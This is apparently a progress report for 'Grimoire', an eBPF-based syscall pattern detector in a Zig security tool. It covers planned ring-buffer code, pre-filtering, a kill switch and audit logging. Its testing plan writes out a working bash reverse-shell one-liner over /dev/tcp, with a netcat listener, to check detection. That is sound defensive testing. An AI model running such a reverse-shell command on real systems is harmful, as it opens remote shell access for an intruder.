# PHASE 2 PROGRESS: Grimoire Integration

**Date**: 2025-10-21
**Status**: 🟡 **PARTIAL INTEGRATION** - Framework complete, full eBPF integration pending

---

## ✅ COMPLETED (Phase 2a)

### 1. **CLI Integration**
- ✅ Added `--enable-grimoire` flag
- ✅ Added `--grimoire-enforce` flag (shadow mode vs enforcement)
- ✅ Added `--grimoire-log=PATH` flag
- ✅ Updated `--help` documentation with Grimoire options
- ✅ Added usage examples for shadow mode and enforcement mode

### 2. **Engine Initialization**
- ✅ Imported `grimoire.zig` module
- ✅ Initialized `GrimoireEngine` in main loop
- ✅ Added proper cleanup with `defer grimoire_engine.deinit()`

### 3. **Statistics Display**
- ✅ Added Grimoire statistics display after monitoring completes
- ✅ Shows total matches, patterns checked, and active processes
- ✅ Integrated with existing V4/V5 statistics output

### 4. **Version Update**
- ✅ Updated version to `6.0.0-grimoire`
- ✅ Added Phase 6 banner with pattern count display

---

## 🟡 PENDING (Phase 2b) - eBPF Ring Buffer Integration

### **CURRENT LIMITATION**

The Grimoire engine is **initialized but not processing events** because:

1. **Current syscall_counter.bpf.o** only emits syscall _counts_ (aggregated data)
2. **Grimoire needs individual syscall events** with:
   - `syscall_nr` - Which syscall was executed
   - `pid` - Process ID
   - `timestamp_ns` - When it occurred
   - `args: [6]u64` - Syscall arguments (for argument constraints)

3. **oracle-advanced.bpf.c** has a ring buffer but emits high-level events:
   ```c
   struct oracle_event {
       __u32 event_type;       // EVENT_EXECUTION, FILE_ACCESS, etc. (not raw syscall)
       __u32 pid;
       __u64 timestamp;
       char target[128];       // File path, not syscall arguments
       ...
   };
   ```

### **WHAT NEEDS TO BE DONE**

#### Option 1: Modify oracle-advanced.bpf.c (RECOMMENDED)

Add a new ring buffer for raw syscall events:

```c
// New event structure for Grimoire
struct grimoire_syscall_event {
    __u32 syscall_nr;       // Raw syscall number
    __u32 pid;
    __u64 timestamp_ns;
    __u64 args[6];          // Six syscall arguments (arg0-arg5)
};

// New ring buffer
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 512 * 1024);  // 512KB
} grimoire_events SEC(".maps");

// Hook into sys_enter tracepoint
SEC("tracepoint/raw_syscalls/sys_enter")
int trace_sys_enter(struct trace_event_raw_sys_enter *ctx) {
    struct grimoire_syscall_event *event = bpf_ringbuf_reserve(&grimoire_events,
                                                                sizeof(*event), 0);
    if (!event) return 0;

    event->syscall_nr = ctx->id;
    event->pid = bpf_get_current_pid_tgid() >> 32;
    event->timestamp_ns = bpf_ktime_get_ns();

    // Copy arguments (tricky: need to handle different syscall conventions)
    event->args[0] = ctx->args[0];
    event->args[1] = ctx->args[1];
    event->args[2] = ctx->args[2];
    event->args[3] = ctx->args[3];
    event->args[4] = ctx->args[4];
    event->args[5] = ctx->args[5];

    bpf_ringbuf_submit(event, 0);
    return 0;
}
```

#### Option 2: Create grimoire-oracle.bpf.c (ALTERNATIVE)

Create a dedicated eBPF program just for Grimoire:

```
src/zig-sentinel/ebpf/grimoire-oracle.bpf.c
```

This program:
- Hooks `raw_syscalls/sys_enter` tracepoint
- Emits only syscalls relevant to patterns (reduces overhead)
- Pre-filters based on syscall numbers in HOT_PATTERNS

**Advantages**:
- Doesn't modify existing oracle-advanced.bpf.c
- Can be conditionally loaded only when `--enable-grimoire` is set
- Cleaner separation of concerns

#### Integration in main.zig

Once eBPF events are available, add this to the main loop:

```zig
// Consume Grimoire ring buffer
if (enable_grimoire) {
    // Read events from grimoire_events ring buffer
    const rb = c.ring_buffer__new(grimoire_events_fd, handle_grimoire_event, &grimoire_engine, null);
    defer c.ring_buffer__free(rb);

    // Poll for events
    while (std.time.milliTimestamp() < end_time) {
        _ = c.ring_buffer__poll(rb, 100); // Poll every 100ms

        // Display Grimoire stats periodically
        if (current_time - last_update_time >= update_interval_ms) {
            if (grimoire_engine.total_matches > 0) {
                std.debug.print("\r⏱️  Elapsed: {d}/{d}s | 📖 Grimoire matches: {d}   ",
                    .{ elapsed, duration_seconds, grimoire_engine.total_matches });
            }
        }
    }
}

// Ring buffer callback
fn handle_grimoire_event(ctx: ?*anyopaque, data: ?*anyopaque, size: usize) callconv(.C) c_int {
    _ = size;
    const engine = @ptrCast(*grimoire.GrimoireEngine, @alignCast(@alignOf(grimoire.GrimoireEngine), ctx));
    const event = @ptrCast(*const GrimoireSyscallEvent, @alignCast(@alignOf(GrimoireSyscallEvent), data));

    // Process through Grimoire
    const match_result = engine.processSyscall(
        event.pid,
        event.syscall_nr,
        event.timestamp_ns,
        event.args,
    ) catch return 0;

    if (match_result) |result| {
        // Log pattern match
        logGrimoireMatch(result) catch {};

        // Enforce if enabled
        if (grimoire_enforce) {
            enforceGrimoireMatch(result) catch {};
        }
    }

    return 0;
}
```

---

## 🔧 BPF PRE-FILTERING (Phase 2c)

To reduce overhead, add BPF-side pre-filtering:

```c
// In grimoire-oracle.bpf.c

// Map of syscalls we care about (from HOT_PATTERNS)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, __u32);   // syscall_nr
    __type(value, __u8);   // 1 = monitored
} grimoire_monitored_syscalls SEC(".maps");

SEC("tracepoint/raw_syscalls/sys_enter")
int trace_sys_enter(struct trace_event_raw_sys_enter *ctx) {
    __u32 syscall_nr = ctx->id;

    // Pre-filter: only send events for syscalls in our patterns
    __u8 *monitored = bpf_map_lookup_elem(&grimoire_monitored_syscalls, &syscall_nr);
    if (!monitored) {
        return 0;  // Ignore this syscall
    }

    // ... rest of event emission code ...
}
```

Populate `grimoire_monitored_syscalls` from userspace:

```zig
// In main.zig, after loading eBPF
if (enable_grimoire) {
    const monitored_fd = c.bpf_object__find_map_fd_by_name(obj, "grimoire_monitored_syscalls");

    // Populate with syscalls from HOT_PATTERNS
    for (grimoire.HOT_PATTERNS) |pattern| {
        for (pattern.steps[0..pattern.step_count]) |step| {
            if (step.syscall_nr) |nr| {
                const value: u8 = 1;
                _ = c.bpf_map_update_elem(monitored_fd, &nr, &value, c.BPF_ANY);
            }
        }
    }
}
```

**Expected reduction**:
- Unfiltered: ~10,000 syscalls/sec → userspace
- Filtered: ~100 syscalls/sec → userspace (only pattern-relevant)
- **99% reduction in ring buffer traffic**

---

## 📝 KILL SWITCH & AUDIT LOGGING (Phase 2d)

### Kill Switch

Add environment variable support:

```zig
// In main.zig
var grimoire_enforce: bool = false;

// Check environment variable
if (std.process.getEnvVarOwned(allocator, "GRIMOIRE_ENFORCE")) |val| {
    defer allocator.free(val);
    grimoire_enforce = std.mem.eql(u8, val, "1");
} else |_| {}

// Allow CLI to override
if (std.mem.eql(u8, arg, "--grimoire-enforce")) {
    grimoire_enforce = true;
}
```

Usage:
```bash
# Shadow mode (default)
sudo ./zig-sentinel --enable-grimoire

# Enforcement mode via env var
GRIMOIRE_ENFORCE=1 sudo ./zig-sentinel --enable-grimoire

# Enforcement mode via CLI
sudo ./zig-sentinel --enable-grimoire --grimoire-enforce
```

### Audit Logging

Log every pattern match to JSON:

```zig
fn logGrimoireMatch(result: grimoire.MatchResult) !void {
    const log_file = try std.fs.openFileAbsolute(grimoire_log_path, .{ .mode = .write_only, .lock = .Exclusive });
    defer log_file.close();

    // Seek to end
    try log_file.seekFromEnd(0);

    // Write JSON entry
    var buf: [4096]u8 = undefined;
    const json = try std.fmt.bufPrint(&buf,
        \\{{"timestamp": {d}, "pattern_id": "0x{x}", "pattern_name": "{s}", "severity": "{s}", "pid": {d}, "action": "{s}"}}
        \\
    , .{
        result.timestamp_ns,
        result.pattern.id_hash,
        std.mem.sliceTo(&result.pattern.name, 0),
        @tagName(result.pattern.severity),
        result.pid,
        if (grimoire_enforce) "terminated" else "logged",
    });

    try log_file.writeAll(json);
}
```

---

## 📊 TESTING PLAN

Once eBPF integration is complete:

### Test 1: Shadow Mode (30 days)
```bash
sudo ./zig-sentinel --enable-grimoire --duration=2592000 > /var/log/grimoire-shadow.log 2>&1 &
```

Monitor for:
- False positives (legitimate processes triggering patterns)
- Performance impact (CPU%, ring buffer drops)
- Pattern coverage (which patterns fire, which don't)

### Test 2: Reverse Shell Detection
```bash
# Terminal 1: Start Grimoire in enforcement mode
sudo ./zig-sentinel --enable-grimoire --grimoire-enforce --duration=60

# Terminal 2: Attempt reverse shell
nc -lvp 4444 &
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

**Expected**: Process terminated before shell spawns, alert logged

### Test 3: Whitelisted Process (No False Positive)
```bash
# Start ssh-agent (whitelisted for credential_exfil pattern)
ssh-agent bash
ssh-add ~/.ssh/id_rsa
```

**Expected**: No alert (whitelisted process)

---

## 🎯 CURRENT STATE SUMMARY

| Component | Status | Notes |
|-----------|--------|-------|
| Grimoire Core (grimoire.zig) | ✅ Complete | 5 patterns, cache-optimized |
| CLI Integration | ✅ Complete | Flags, help, examples |
| Engine Initialization | ✅ Complete | Lifecycle management |
| Statistics Display | ✅ Complete | Integrated with V4/V5 output |
| eBPF Event Source | ❌ Pending | Need raw syscall events with args |
| Ring Buffer Consumer | ❌ Pending | Need to poll grimoire_events |
| BPF Pre-filtering | ❌ Pending | Reduce event stream 99% |
| Kill Switch | ⚠️ Partial | CLI flag exists, env var TODO |
| Audit Logging | ❌ Pending | JSON logging of matches |
| 30-Day Shadow Mode | ❌ Not Started | Requires full integration first |

---

## 🚀 NEXT STEPS (Priority Order)

1. **Create grimoire-oracle.bpf.c** - Dedicated eBPF program for raw syscall events
2. **Implement ring buffer consumer** - Poll and process events in main.zig
3. **Add BPF pre-filtering** - Populate monitored_syscalls map
4. **Implement audit logging** - JSON output of pattern matches
5. **Add environment variable kill switch** - GRIMOIRE_ENFORCE=0
6. **Start 30-day shadow mode** - Monitor false positive rate
7. **Tune whitelists** - Add site-specific trusted processes
8. **Enable enforcement** - Only after FP rate <0.01%

---

**Current Phase**: 2a (Framework) ✅ Complete
**Next Phase**: 2b (eBPF Integration) 🔨 In Progress
**Target**: Phase 2 complete by end of week

---

*"The Grimoire is forged. The Doctrine is encoded. The Foundation is laid. Now we await the Oracle's whisper."*
